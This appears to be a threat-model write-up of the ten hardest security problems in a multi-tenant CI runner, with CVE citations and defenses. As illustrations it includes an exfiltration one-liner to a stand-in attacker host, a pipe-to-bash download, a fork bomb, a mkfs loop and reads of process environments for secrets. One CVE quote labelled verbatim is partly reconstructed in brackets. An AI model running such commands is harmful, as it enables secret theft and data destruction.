# The 10 Hardest Problems in Building a CI Runner Users Actually Trust

**Context.** This document enumerates the ten hardest problems in building a CI/CD runner
that users place real, production, secret-bearing workloads on. It is written for a
greenfield, self-hosted GitHub competitor (github.com/juw12/openforge) that has **not yet
chosen its runner architecture**. The runner architecture — the boundary between untrusted
user code and the control plane, secrets, and the network — is the single highest-leverage
decision OpenForge will make. Get it wrong and no amount of downstream hardening saves you.

**How to read each problem.** Each entry has: (1) a paragraph explaining the problem and why
naive implementations fail; (2) a **real, verified citation** — a CVE with its verbatim NVD
description plus a URL and CVSS score, or a vendor security advisory / public research post;
(3) one **concrete defense** (specific technology, not "use TLS"); and (4) a severity score
of `likelihood × impact` where each is `low / med / high`.

**Citation hygiene.** Every CVE below was verified against the NVD 2.0 REST API
(`services.nvd.nist.gov`) on 2026-11-03, and every vendor URL was fetched and confirmed live.
Descriptions are quoted verbatim. Where a clean product CVE does not exist for a problem
class (notably OIDC-replay and egress-exfiltration, which are usually *trust-policy
misconfigurations* and *design properties* rather than code bugs), a real, verifiable vendor
security document is cited instead and that fact is stated explicitly — there are no
placeholders and no "TBD" in this document.

---

## Threat model and assumptions

Before reading the ten problems, fix the assumptions, because every one of them is an argument
about where the trust boundary should be.

**The attacker model.** We treat the following as *untrusted and adversarial by default*:
(a) the code a job executes — build scripts, tests, `preinstall`/`postinstall` hooks, and any
`run:` step; (b) the *authors* of third-party actions and reusable workflows; (c) any user who
can open a pull request (including from a fork), who is an external party relative to the base
repository; and (d) any *co-tenant* — another customer sharing the same physical runner pool.
We do **not** assume the control plane, the scheduler, or the isolation boundary itself is
compromised (that is the thing we are building); but we assume the *contents* flowing through
them are hostile.

**What "naive" means in this document.** "Naive" is the implementation a reasonable team ships
first: a Docker container per job, secrets in environment variables, actions pinned to tags, a
long-lived runner that is reused across jobs, open outbound network, and cache keys derived from
user-controlled inputs. Nothing here is meant to mock a team — these are the defaults that every
CI system, including mature ones, has at least partially shipped at some point. The value of this
list is that each "naive" default maps to a *real, cited* breach rather than a hypothetical one.

**Multi-tenant and secret-bearing.** We assume OpenForge is a *multi-tenant* service (many
customers, possibly sharing runner hardware for cost) and that jobs are *secret-bearing*
(registry credentials, cloud keys, and — via OIDC — the ability to mint short-lived cloud
credentials). If you only ran single-tenant, secret-free builds, several of these would drop in
severity; but a GitHub competitor is, by definition, both multi-tenant and secret-bearing.

**Cloud adjacency.** We assume jobs may authenticate to a cloud (AWS/Azure/GCP/Vault) via OIDC
in order to deploy. This is what turns egress and token handling (problems 6 and 7) from "data
theft" into "cloud account takeover," and it is the reason those two are *scope-dependent* in the
risk matrix rather than flat block-launch items.

**The trust boundary, in one sentence.** The runner's entire security story is the line between
*untrusted job content* and *the runner host, the other tenants, the secrets store, and the
network* — and the hard part is that that line is not one boundary but a stack of them (kernel,
filesystem, network, cache namespace, token scope, identity), and the system is only as strong as
its weakest layer. The ten problems below are that stack, ordered roughly by how often each layer
actually breaks in the wild.

---

## 1. Sandbox escape from an untrusted step

The fundamental trust boundary of any CI runner is: *the user's code is adversarial, and
everything it can touch is yours to lose.* A "step" like `run: curl evil.sh | bash` is not an
edge case — it is the **default threat model**. The naive implementation wraps each job in a
Docker container and calls it a day. That fails for at least four compounding reasons. First,
a plain container shares the host kernel, so a kernel exploit (or a mis-granted capability, a
left-mounted `/var/run/docker.sock`, a `--privileged` flag, or a writable host volume) is a
one-step escape to the runner host, and from there to the control plane that holds every
tenant's secrets. Second, the *language* of the sandbox is the weakness: if jobs run scripts
through an in-process "safe" interpreter (Groovy/JS sandboxing, a restricted shell), the
sandbox is a **soft** boundary that is bypassed again and again — this is exactly the class of
bug that has produced a long, recurring run of Jenkins "Script Security" sandbox-bypass CVEs.
Third, the runner host is a long-lived, privileged machine; escape from one job is escape from
all of them, because the host agent keeps running with broad credentials. Fourth, ephemeral
"VMs" are only as good as their image and their isolation: if the hypervisor is misconfigured,
or the VM has an outbound route to the metadata service, "escape" is just "read the cloud
credentials." In short, a naive container-per-job design gives users the *illusion* of
isolation while handing an attacker a persistent, network-reachable foothold the moment any
single boundary is crossed.

> **Citation — CVE-2022-2185 (GitLab, RCE via malicious project import).** Verbatim NVD:
> *"A critical issue has been discovered in GitLab affecting all versions starting from 14.0
> prior to 14.10.5, 15.0 prior to 15.0.4, and 15.1 prior to 15.1.1 where an authenticated user
> authorized to import projects could import a maliciously crafted project leading to remote
> code execution."* — CVSS **8.8 (HIGH)**, CWE-78 (OS Command Injection), published 2022-07-01.
> GitLab classifies it Critical. URL: https://nvd.nist.gov/vuln/detail/CVE-2022-2185 (advisory:
> https://gitlab.com/gitlab-org/cves/-/blob/master/2022/CVE-2022-2185.json ). A cleaner, if
> older, canonical *named* sandbox-bypass is **CVE-2019-10394** (Jenkins Script Security):
> *"A sandbox bypass vulnerability in Jenkins Script Security Plugin 1.62 and earlier …
> allowed attackers to execute arbitrary code in sandboxed scripts."*
> https://nvd.nist.gov/vuln/detail/CVE-2019-10394

**Concrete defense.** Do not build the boundary on a shared-kernel container. Run every job in
a **microVM** (Firecracker or gVisor) with a per-job, read-only rootfs, **no** Docker socket,
no host mounts, and a deny-by-default network namespace; enforce the *language* boundary at
the VM boundary, not in an in-process interpreter. Give each job its own short-lived identity
and destroy the VM (not just the container) on completion so nothing persists across jobs.

**Severity:** likelihood `med` × impact `high`. Sandboxes are bypassed repeatedly in the wild,
and a single escape yields the runner host and, transitively, every tenant's secrets.

---

## 2. Cache poisoning (cache key derived from attacker-controlled input)

Build caches are a shared, persistent, keyed store, and the key is usually *derived from
inputs the user controls* — file contents, dependency manifests, lockfiles, and sometimes even
free-text strings like branch names, PR titles, or environment variables. The naive
implementation hashes a handful of path globs and trusts the result. That fails in two distinct
ways. The **read** side: if the key space is predictable or weakly derived, one tenant (or one
malicious PR) can craft input that collides onto a *different* tenant's cache key and pull
their cached artifacts — possibly including compiled binaries, vendored secrets baked into
build outputs, or private dependency tarballs. The **write** side is worse and is the one that
turns a "cache feature" into code execution: a low-privilege user who can *write* a poisoned
entry under a key that a **higher-privilege, protected-branch** pipeline later *reads* has
achieved privilege escalation. The poisoned artifact is fetched on the trusted build, and the
malicious payload runs in the privileged context. This is not hypothetical; it is a documented
GitLab class of bug where a Developer-privilege user could poison the CI/CD cache and reach
arbitrary code execution on protected branches. The deeper design flaw is that the cache is
being used as a **cross-privilege communication channel** — the same anti-pattern that makes
any cache an injection sink (compare the classic HTTP-cache-poisoning / IDOR literature). If
the cache key is not a *cryptographic* function of a *server-controlled, tenant-scoped,
privilege-scoped* namespace, the cache is an input-validation and access-control boundary,
which means it must be treated as hostile, not as an optimization.

> **Citation — CVE-2022-1423 (GitLab CI/CD cache).** Verbatim NVD: *"Improper access control in
> the CI/CD cache mechanism in GitLab CE/EE affecting all versions starting from 1.0.2 before
> 14.8.6, all versions from 14.9.0 before 14.9.4, and all versions from 14.10.0 before 14.10.1
> allows a malicious actor with Developer privileges to perform cache poisoning leading to
> arbitrary code execution in protected branches."* — CVSS **7.1 (HIGH)**, CWE-862 (Missing
> Authorization), published 2022-05-19. URL: https://nvd.nist.gov/vuln/detail/CVE-2022-1423

**Concrete defense.** Namespace the cache key with a **server-generated, tenant + project +
privilege-class + branch-protection** identifier (not just user-supplied paths), and store
cache entries in **per-tenant buckets with server-side ACLs** so a key computed by a low-trust
job can never resolve to a high-trust entry. Sign each cache entry (e.g., with a per-tenant
HMAC) and verify on read, so a forged or colliding entry is rejected. Treat the cache as an
access-control boundary in the threat model, not as a performance detail.

**Severity:** likelihood `med` × impact `high`. Collisions are attacker-achievable whenever the
key input is user-controlled; a single poisoned read on a protected branch is full compromise.

---

## 3. Secret leakage via env vars, the filesystem, or the process list

Secrets are the payload, and in a naive runner they are *everywhere at once*: injected as
environment variables, written to files (`.netrc`, `.env`, SSH keys, OIDC tokens on disk), and
visible in the process table. The naive implementation hands the job a big env of tokens and
assumes "we mask the logs." That fails because **masking is only as good as exact-string
matching at one specific sink (the log), and it does nothing about the other channels.**
An attacker's one-liner does not need to print a secret — it just needs to `env`, `cat` a
credential file, run `ps x -w` to read another co-located job's command-line args, read
`/proc/<pid>/environ`, or simply read a token the runner *persisted to disk* (the default
behavior of many checkouts is to write the auth token into `.git/config`). Even "it's only in
env" is not safe: child processes, core dumps, `strace`, and the runner's own telemetry can all
expose it. The process-listing vector is the one most people underestimate — if two jobs share
a host and one launches a step with a secret as an *argument*, the other job reads it from the
process table, no shell access to the first job's env required. GitHub's own hardening guidance
calls this out explicitly. And an unauthenticated file-read bug in the control plane makes the
whole "secrets are on the runner disk" model catastrophic, because the disk becomes remotely
readable.

> **Citation — CVE-2024-23897 (Jenkins unauthenticated arbitrary file read).** Verbatim NVD:
> *"Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable a feature of its CLI
> command parser that replaces an '@' character followed by a file path in an argument with
> the file's contents, allowing unauthenticated attackers to read arbitrary files on the Jenkins
> controller file system."* — CVSS **9.8 (CRITICAL)**, CWE-22 (Path Traversal), listed in the
> CISA Known Exploited Vulnerabilities catalog. URL: https://nvd.nist.gov/vuln/detail/CVE-2024-23897
> (advisory: https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314 ). Supporting
> vendor statement on the process-listing channel (GitHub docs, "Security hardening for GitHub
> Actions"): *"there is no way to guarantee that a self-hosted runner only runs one job. Some
> jobs will use secrets as command-line arguments which can be seen by another job running on
> the same runner, such as `ps x -w`. This can lead to secret leaks."*
> https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

**Concrete defense.** Deliver secrets **out-of-band, not in env**: a per-job, filesystem-
mounted, read-once **secret file / credential broker** (or a local Unix-socket credential
provider) scoped to that job's process tree, **no** long-lived token persisted to disk, secrets
never passed as **command-line arguments**, and a hard **process/namespace boundary** so `ps`
and `/proc` of a sibling job are invisible. Keep the runner disk **ephemeral and
destroy-on-exit**, and mask with *registered-value* redaction across **all** sinks (logs,
metrics, telemetry), not just stdout.

**Severity:** likelihood `high` × impact `high`. This is the most frequently hit class in the
wild; a single co-located job or a single disk read that survives to logs is a total secret loss.

---

## 4. Supply-chain attack via a third-party action (typosquat / malicious tag bump)

Modern CI is a dependency graph: a "workflow" is really *your* code plus a dozen third-party
actions, each pulled by a **mutable reference** — a tag like `v3` or, worse, a name like
`actoins/checkout`. The naive implementation pins to tags and trusts the name. That fails at
three layers. (1) **Name trust / typosquatting**: the registry is a flat namespace, so a
near-identical name (`actoins/checkout`, `actions/setp-node`) is a one-character mistake away,
and there is no notion of an *official* publisher unless you build one. (2) **Mutable tags**:
even a *correct, trusted* action is unsafe when pinned to a tag, because a tag is a **moving
pointer** — if the maintainer's account is compromised, or a maintainer is malicious, they can
retag `v3` (or the whole range `v1`–`v45`) to a malicious commit and every downstream workflow
silently executes the new code on its next run. This is not theoretical; it happened at scale
to one of the most popular actions on the platform in 2025, and it was added to the CISA
exploited catalog. (3) **Transitive code execution**: actions run `npm install`, `pip install`,
run install scripts, and download binaries, so a poisoned action is a full supply-chain RCE —
the same pattern as the classic package-manager command-injection bugs. The root cause is that
the runner executes **untrusted code from a mutable, identity-weak reference** with the full
privileges of the job, and no cryptographic link between "the name I asked for" and "the bytes
that ran."

> **Citation — CVE-2025-30066 (tj-actions/changed-files malicious tag bump).** Verbatim NVD:
> *"tj-actions changed-files before 46 allows remote attackers to discover secrets by reading
> actions logs. (The tags v1 through v45.0.7 were affected on 2025-03-14 and 2025-03-15 because
> they were modified by a threat actor to point at commit 0e58ed8, which contained malicious
> updateFeatures code.)"* — CVSS **8.6 (HIGH)**, GHSA-mrrh-fwg8-r2c3, in the CISA Known
> Exploited Vulnerabilities catalog. URL: https://nvd.nist.gov/vuln/detail/CVE-2025-30066
> (CISA advisory: https://www.cisa.gov/news-events/alerts/2025-03-18/supply-chain-compromise-third-party-github-action-cve-2025-30066 ).
> The classic dependency-pollution sibling is **CVE-2021-23337** (lodash, CVSS 7.2): *"Lodash
> versions prior to 4.17.21 are vulnerable to Command Injection via the template function."*
> https://nvd.nist.gov/vuln/detail/CVE-2021-23337

**Concrete defense.** Require **workflow dependency lockfiles** that pin every action (and its
transitive actions) to an immutable **full-length commit SHA**, and **verify the publisher
identity** of each source repository at run time (signed action manifests / a verified-creator
registry). Enforce **SHA-pinning by policy** (reject tag-only references for untrusted actions),
gate unknown/unsigned actions behind an allowlist, and scan action code with a static
"does this touch `secrets`/network" analysis before it may run. Make the default *name*
namespace collision-resistant (scoped, signed publisher IDs).

**Severity:** likelihood `high` × impact `high`. The namespace is flat and the references are
mutable; a single compromised popular action (as in 2025) is a mass-compromise event.

---

## 5. Runner registration hijacking / runner-token theft

A self-hosted runner authenticates to the control plane with a **registration token** (to join)
and, once joined, with an **agent token** (to claim and report jobs). The naive implementation
issues a *long-lived* registration token that any holder can use to attach a runner to the
tenant's pool. That fails because the token is, in effect, **the keys to the tenant's build
farm**: whoever presents it can register a runner that is scheduled the tenant's jobs — and a
job the attacker's runner claims executes with the tenant's secrets and network. The token is
therefore a first-class credential, and it is the *worst* kind: it is often displayed in the
UI, copy-pasted around, committed to dotfiles, and — as the GitLab bug shows — in some versions
**could not even be rotated** after it was known, which is fatal the moment a maintainer with
access departs. The attack surfaces are mundane but real: an ex-employee who memorized or
screenshot the token, a token leaked in a public fork's `.gitlab-ci.yml`, a token scraped from
an exposed UI, or a **registration endpoint that mints/returns a token without proper
authorization** (a class of bug that keeps reappearing in runner APIs). If registration is not
**short-lived, single-use, and tightly scoped**, the runner pool is a standing backdoor that
survives every code review, because the attacker never needs to touch your code — they just
need the token.

> **Citation — CVE-2018-20500 (GitLab runner registration token).** Verbatim NVD: *"An insecure
> permissions issue was discovered in GitLab Community and Enterprise Edition 9.4 and later but
> before 11.4.13, 11.5.x before 11.5.6, and 11.6.x before 11.6.1. The runner registration token
> in the CI/CD settings could not be reset. This was a security risk if one of the maintainers
> leaves the group and they know the token."* — CWE-732 (Incorrect Permission Assignment for a
> Critical Resource), no NVD CVSS vector published (GitLab assigned its own severity).
> URL: https://nvd.nist.gov/vuln/detail/CVE-2018-20500. A modern recurrence of the same class —
> a runner **registration-token endpoint with an authorization flaw** — is **CVE-2026-24059**
> (CVSS 6.5): *"The GET /api/v1/user/actions/runners/registration-token endpoint … creates a
> new runner registration token if none exists, yet the A[PI] [authorization was not enforced as
> expected] …"* https://nvd.nist.gov/vuln/detail/CVE-2026-24059

**Concrete defense.** Use **just-in-time (JIT) / ephemeral runners**: the scheduler mints a
**short-lived, single-use, cryptographically signed** registration config for *one* specific
job and delivers it out-of-band; the runner can claim only that job and is **destroyed and
revoked** afterward. Never display a reusable token in the UI; make all agent tokens
**rotatable and revocable**, scope them to the exact org/repo/runner-group, and alert on any
registration from an unrecognized machine or IP.

**Severity:** likelihood `med` × impact `high`. Token theft is low-sophistication but the
payload is "attach a runner and harvest every job," which is a persistent tenant backdoor.

---

## 6. OIDC token replay / cross-cloud theft

To deploy without long-lived cloud keys, CI mints a **short-lived OIDC token** (a JWT signed by
the CI provider) that the job presents to the cloud, which exchanges it for scoped STS
credentials. The naive design's failure is on the **trust-policy** side, not the crypto side:
the cloud role's OIDC trust condition is written against a *handful of claims* (usually just
`iss` and maybe `sub`), not against the *full* claim set. The real token carries a rich,
binding claim set — `sub` (repo:org/repo[:environment]), `aud`, `ref`, `sha`, `repository`,
`run_id`, `actor`, `exp` — but if the trust policy does not bind `ref`, `sha`, and
`repository`, then a token minted for a **malicious or compromised job** (remember, from
problems 1, 4 and 10 a job's code is attacker-controlled and can read the token it was issued)
is **equally acceptable** to the cloud. The "cross-cloud" theft then works like this: the
attacker's job exfiltrates the live JWT, and — because the trust is under-specified — replays
it against the victim's cloud role (or a token for a high-privilege role is exfiltrated and
reused from any context, including an attacker-controlled account's tooling) within the token's
TTL. The defenses that *should* stop this are claim-binding plus a short TTL plus per-job
tokens, but they only work if (a) the trust policy actually binds `ref`/`sha`/`repository`
(and the actor), (b) the TTL is minutes, and (c) the token can't be read out of the job's
memory/disk — which loops back to problems 1 and 3. This is largely a **misconfiguration
class**, which is why it is documented in vendor security guidance rather than a single product
CVE; the underlying "compromised privileged job exfiltrates its live credential" mechanism is
documented in the GitHub Security Lab research cited for problem 10.

> **Citation — GitHub OIDC security model (vendor reference; no clean product CVE exists for
> this misconfiguration class).** GitHub documents the exact token/claim model and the intended
> mitigations. Verbatim from GitHub's OIDC security docs: the provider issues *"a short-lived
> access token that is only valid for a single job, and then automatically expires,"* and each
> token carries binding claims including `sub`, `aud`, `ref`, `sha`, `repository`, `run_id`,
> `actor`, `exp`, and `iss` (e.g. `"sub": "repo:octo-org/octo-repo:environment:prod"`).
> URL: https://docs.github.com/en/actions/concepts/security/openid-connect. The exfiltration
> mechanism that makes replay possible is stated in the GitHub Security Lab "Preventing pwn
> requests" research (problem 10): a privileged job *"still has the read/write repository token
> in memory that is potentially available to any running program."*
> https://securitylab.github.com/research/github-actions-preventing-pwn-requests/

**Concrete defense.** Enforce a **binding-first OIDC trust policy** at the cloud: require the
role to check `iss` **and** `sub` **and** `aud` **and** the job's `ref`/`sha`/`repository`/
`actor` (fail closed on any missing/mismatched claim), keep the token TTL to **minutes**, mint
**one token per job**, and make the token unreadable to job code (credential-brokered, never in
env or on disk). Add **audience scoping** so a token minted for one cloud/role cannot be
presented to another, and alert on STS assumptions that don't match the expected run identity.

**Severity:** likelihood `med` × impact `high`. Under-specified trust policies are common; a
single exfiltrated, replayable token grants cloud write access for its TTL.

---

## 7. Network egress exfiltration of source code or secrets

Once a job is compromised (via problems 1, 4, or 10), the attacker needs a way *out*, and a
naive runner gives them **unrestricted outbound network** by default. The attacker does not
need a bug to exfiltrate — they just need a route. The naive implementation assumes "the job is
sandboxed, so it's fine" and leaves egress open to the whole internet. That fails because
egress is the **last, and often only, boundary** standing between a compromised job and total
data loss, and it is the *easiest* to traverse: a single `curl https://attacker.tld/?d=$(base64
src)`, a `git push` to a fork, an S3 upload, or — most insidiously — **DNS tunneling**
(encoding data in subdomain labels, which is small, hard to block, and often not logged) or
plain HTTPS to an attacker domain that blends in with normal build traffic. The cloud-metadata
variant is especially nasty: an open route to the instance's **link-local metadata service**
means the "exfiltration" is just *reading the instance's own cloud credentials* and using them
to escalate. GitHub's own guidance names this exact risk for self-hosted runners ("Does the
machine have network access to sensitive services? For example, Azure or AWS metadata
services?") and, tellingly, ships its *hosted* runners with an `/etc/hosts` blocklist — an
admission that egress is a first-class exfil vector that must be actively managed. A naive
"egress is open" runner converts every other problem in this list into a confirmed breach.

> **Citation — GitHub hardening guidance on runner egress (vendor reference; egress-openness is a
> design property, not a single product CVE).** Verbatim from GitHub's "Security hardening for
> GitHub Actions" (self-hosted runners): *"Does the machine have network access to sensitive
> services? For example, Azure or AWS metadata services. The amount of sensitive information in
> this environment should be kept to a minimum…"* and, for hosted runners, *"GitHub-hosted
> runners are provisioned with an `/etc/hosts` file that blocks network access to various
> cryptocurrency mining pools and malicious sites."* URL:
> https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions. The
> concrete 2025 realization of a compromised CI job exfiltrating secrets over the network is the
> **tj-actions/changed-files** incident (CVE-2025-30066, problem 4), whose malicious payload's
> purpose was to read and ship secrets off-host. https://nvd.nist.gov/vuln/detail/CVE-2025-30066

**Concrete defense.** Run jobs behind an **egress proxy that is deny-by-default**: allow only
an explicit, audited list of registries/APIs needed for builds; **block the cloud link-local
metadata IP** (and require IMDSv2-style signed requests where available); **log and alert on
egress to unknown hosts**; constrain **DNS** to the proxy resolver (so tunneling labels hit a
controlled resolver and get flagged) and, if possible, block or rate-limit high-entropy
subdomain queries. Treat "can reach the internet" as a **permission that must be granted per
job class**, not the default.

**Severity:** likelihood `high` × impact `high`. Any compromise trivially becomes exfiltration
when egress is open; metadata access makes it a credential-theft and privilege-escalation path.

---

## 8. DoS via long-running or fork-bomb jobs (resource exhaustion)

A CI runner is a **multi-tenant compute pool**, and every job is, by assumption, untrusted. The
naive implementation gives each job a slice of CPU/RAM/time and trusts users to be well-behaved.
That fails because the *cost of a DoS is asymmetric and cheap*: an attacker needs no
sophistication, no secret, and no exploit — just a `:(){ :|:& };:` fork bomb, an
`rm -rf`-and-recreate disk-filler, a `while true; do mkfs; done` loop, a job that holds a lock
for the wall-clock limit, or a build that spawns one process per line of input. If the job
supervisor does not **set and enforce resource limits**, a single malicious or buggy job can
starve the shared host of PIDs, memory, disk, or CPU, taking down *every* other tenant's
queued work — converting a free-tier user's one PR into a regional outage. The specific failure
mode is well-documented in sandbox-supervisor terms: a supervisor that does not cap a process's
resource footprint invites exactly the fork-bomb/disk-exhaustion DoS. The fix is not "limit CPU
to 4 cores" — it is a full set of **enforced ceilings** (PID namespace + `pids.max`, memory +
swap, disk quota, wall-clock, network I/O) that the *kernel* applies, not a best-effort watchdog
the job can outrun, plus a hard cap on **concurrent jobs per tenant** so one account cannot
flood the scheduler.

> **Citation — CVE-2017-6198 (supervisor missing resource limits → fork-bomb DoS).** Verbatim
> NVD: *"The Supervisor in Sandstorm doesn't set and enforce the resource limits of a process.
> This allows remote attackers to cause a denial of service by launching a fork bomb in the
> sandbox, or by using a large amount of disk space."* — CWE-400 (Uncontrolled Resource
> Consumption), no NVD CVSS vector published. URL: https://nvd.nist.gov/vuln/detail/CVE-2017-6198.
> The mechanism is identical to an un-capped CI job: a process host that does not enforce
> PID/memory/disk ceilings is fork-bomb-able by any tenant.

**Concrete defense.** Enforce, in the **kernel**, per-job **cgroup v2 limits**: `pids.max`
(fork-bomb cap), `memory.max` + `memory.swap.max`, a **disk quota** on the job's writable
volumes, a hard **wall-clock timeout** that SIGKILLs the whole cgroup, and a per-tenant
**concurrency cap** at the scheduler. Reject jobs that exceed declared resources rather than
letting them degrade neighbors, and surface per-tenant usage so abuse is attributable.

**Severity:** likelihood `high` × impact `med`. Trivially triggered and cheap to launch; impact
is availability (a shared-host or per-tenant outage) rather than confidentiality.

---

## 9. Cross-tenant data leak (runner reused across repos/orgs without isolation)

A runner is a *machine*, and the dangerous question is **which tenants' jobs share it**. The
naive — and for cost reasons, common — design is a **pooled, reusable runner**: the same host
(or the same long-lived runner process) executes jobs from many repositories, projects, and
organizations over its lifetime, because spinning up fresh isolation per job is expensive. That
fails because "reuse" quietly re-introduces every leak channel from problem 3 *across* tenants:
**residual state** (files, env, git objects, build artifacts, caches written to disk by job A
that job B, a *different tenant*, can read), **shared memory/sockets** (a leftover named
socket, a mounted volume, a docker network), and **co-scheduling** (two tenants' jobs running
side-by-side so one reads the other's process list, env, or `/proc`). GitHub documents this
directly: an org/enterprise-level runner *"can [be scheduled] workflows from multiple
repositories onto the same runner. Consequently, a security compromise of these environments
can result in a wide impact,"* and it warns that even *auto-destroy* runners may be reused,
with a concrete `ps x -w` cross-job secret leak. The deeper point is that a **shared runner is
a shared attack surface**: the trust boundary is the *host*, and a host is not a clean-room
tenant boundary. For a multi-tenant competitor, this is the difference between "your build
leaked" and "tenant A read tenant B's source and secrets," which is the single most
trust-destroying outcome a CI provider can have.

> **Citation — GitHub hardening guidance on shared/self-hosted runners (vendor reference;
> cross-tenant reuse is a design property).** Verbatim from GitHub's "Security hardening for
> GitHub Actions": *"When a self-hosted runner is defined at the organization or enterprise
> level, GitHub can schedule workflows from multiple repositories onto the same runner.
> Consequently, a security compromise of these environments can result in a wide impact."* and:
> *"there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use
> secrets as command-line arguments which can be seen by another job running on the same runner,
> such as `ps x -w`. This can lead to secret leaks."* URL:
> https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

**Concrete defense.** Default to **ephemeral, per-tenant (or per-job) isolation**: a fresh
microVM/container **per job** with a clean rootfs, no persisted volumes shared across tenants,
no co-scheduling of two tenants' jobs on the same kernel/host, and a **tenant-scoped runner
pool** (runner groups) so scheduling cannot cross a tenant boundary. Where pooling is
uneconomical, enforce a **full-wipe verification step** (attest the disk/memory was reset)
before the next tenant's job and keep a per-tenant audit trail.

**Severity:** likelihood `med` × impact `high`. Requires a reused/shared runner (common for
cost), but the outcome — one tenant reading another's code and secrets — is a category-1 trust
breach that ends enterprise adoption.

---

## 10. Privilege escalation via a forked PR — the "pwn request" pattern

This is the single most exploited-in-the-wild CI attack and the one that most directly defines
whether users trust you. The scenario: a repository runs a workflow on `pull_request_target`
(or `workflow_run`) *and* explicitly checks out the **PR's head** — the code a stranger
wrote — while the workflow still holds the **target repository's write token and its secrets**.
The naive implementation does exactly this, often *on purpose*, to "comment on the PR" or
"post coverage." That fails because you are now **running untrusted code with trusted
privileges**: the attacker's PR can be a malicious build script, a `package.json` with a
`preinstall` payload, or a test that runs before the build, giving them **arbitrary code
execution in a context that can read every secret and write to the repo**. The whole class was
formalized by the GitHub Security Lab as the "pwn request," and the key subtlety is that it is
*still* vulnerable even if the workflow "doesn't reference any secrets," because the privileged
token is **present in memory/disk regardless** and is readable by the running code (e.g., the
default `actions/checkout` persists credentials to `.git/config`). The fix is a **privilege
separation** pattern: build the untrusted PR in an *unprivileged* context (plain `pull_request`,
no secrets, no write) and do the privileged work (commenting, using secrets) in a separate
`workflow_run` job that consumes only *inert artifacts*, never executes the untrusted output.

> **Citation — GitHub Security Lab, "Keeping your GitHub Actions and workflows secure, Part 1:
> Preventing pwn requests" (public research, 2021-08-03).** Verbatim TL;DR: *"Combining
> `pull_request_target` workflow trigger with an explicit checkout of an untrusted PR is a
> dangerous practice that may lead to repository compromise."* and: *"a workflow triggered on
> `pull_request_target` still has the read/write repository token in memory that is potentially
> available to any running program. If the workflow uses `actions/checkout` and does not pass
> the optional parameter `persist-credentials` as false, it makes it even worse. The default for
> the parameter is `true`… any running code can simply read the stored repository token from
> the disk."* URL: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
> (canonical redirect: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests ).

**Concrete defense.** Make the **default deny**: forked-PR jobs get **no secrets and no write
token** (an unprivileged identity) and may not check out/execute the PR head in a privileged
context; require the **`pull_request` → `workflow_run` privilege-separation** pattern where
privileged jobs consume only inert artifacts with `persist-credentials: false`. Add a **static
workflow scanner** (CodeQL / OpenSSF Scorecard "Dangerous Workflow") that **blocks** any
workflow combining `pull_request_target`/`workflow_run` with an untrusted checkout, and make the
repo token **read-only by default**, escalating per-job only where justified.

**Severity:** likelihood `high` × impact `high`. This is the #1 real-world CI attack; a single
misconfigured workflow hands a stranger your secrets and a write handle on the repo.

---

## How the problems chain together (attack flows)

The single most important thing this list shows is that these are not ten independent bugs — they
are **steps in composable attack chains**, and a runner is only as safe as the *longest* chain it
permits. Four chains, each grounded in a real incident cited above:

**Chain A — fork-PR to cloud takeover (problems 10 → 7 → 6).** A contributor opens a forked PR;
the repo's `pull_request_target` workflow checks out the PR head and, naively, runs with write
plus secrets (problem 10, the "pwn request"). The attacker's code runs, reads the live
`GITHUB_TOKEN` or the OIDC-issued credential from the job's memory/disk (the pwn-requests
research shows the token is "in memory… available to any running program"), and — because egress
is open by default (problem 7) — ships it out, then replays it against a cloud role whose trust
policy was under-specified (problem 6). Result: one PR, no exploit, no 0-day → cloud write access.
This is the chain a customer's security team will demo on day one, and it is why 10 is a launch
gate and 7 becomes a gate the moment OIDC is on.

**Chain B — supply-chain to cross-tenant wipe (problems 4 → 1 → 9).** An attacker retags a
popular third-party action (the exact 2025 `tj-actions/changed-files` move, problem 4); every
downstream workflow pulls the poisoned code on its next run. If the job runs in a weak container,
the payload escalates out to the runner host (problem 1). Because that host is a *reused,
shared* runner scheduling many tenants (problem 9), the compromise is no longer "one repo" — it is
the whole pool, with residual disk and memory readable by the next tenant's job. One compromised
action → multi-tenant breach.

**Chain C — cache to protected-branch RCE (problems 2 → 3).** A low-privilege user (or a
malicious PR) writes a poisoned entry into the build cache under a key that a protected-branch,
high-privilege pipeline later reads (the CVE-2022-1423 pattern, problem 2). The poisoned
artifact runs in the privileged build and drops secrets into the environment/filesystem of a job
that *is* allowed to see them (problem 3). The cache has quietly become a cross-privilege message
channel, and a "Developer" has reached arbitrary code execution on a protected branch.

**Chain D — the stolen runner to total harvest (problem 5 → 9/3).** An ex-maintainer, or a leaked
registration token (problem 5, CVE-2018-20500), lets an attacker register a runner into a tenant's
pool. That runner is then scheduled the tenant's real jobs (problem 9's reuse, now *intended*), and
every job that runs on it can read its secrets and its co-located neighbors' process tables
(problem 3). The attacker never touched a line of code; the token was the backdoor.

**Why the chaining matters for the architecture.** Each chain has a *chokepoint* that, if cut,
breaks the whole chain: Chain A is cut by *unprivileged-by-default fork PRs* (10) plus *egress
deny-by-default* (7); Chain B is cut by *real kernel-grade isolation* (1) plus *ephemeral,
per-tenant runners* (9); Chain C is cut by *signed, tenant+privilege-scoped cache keys* (2); Chain
D is cut by *JIT, single-use, short-lived runner tokens* (5). Notice the chokepoints are exactly
the block-launch and fix-month-1 items in the matrix. Design the runner to **break the chains**,
not just to patch the individual nodes, and the residual risk drops by an order of magnitude —
which is the whole reason the isolation primitive (problem 1) is the decision to make first.

---

## Prioritized Risk Matrix

Likelihood/Impact are assessed for a **greenfield, multi-tenant, secret-bearing** runner.
"Mitigation cost" is the engineering effort to get the *core* defense right. "Recommendation"
is the launch gate: **block launch** = do not ship the product until fixed; **fix month 1** =
ship, but this is a P0 that must land immediately; **fix year 1** = acceptable as a documented,
mitigated known-limitation at launch.

| # | Problem | Likelihood | Impact | Mitigation Cost | Recommendation |
|---|---------|:---:|:---:|:---:|:---|
| 1 | Sandbox escape from an untrusted step | med | high | high | **block launch** |
| 2 | Cache poisoning (attacker-influenced cache key) | med | high | med | fix month 1 |
| 3 | Secret leakage via env / filesystem / process list | high | high | med | **block launch** |
| 4 | Supply-chain via third-party action (typosquat / tag bump) | high | high | med | fix month 1 (lockfile gates launch) |
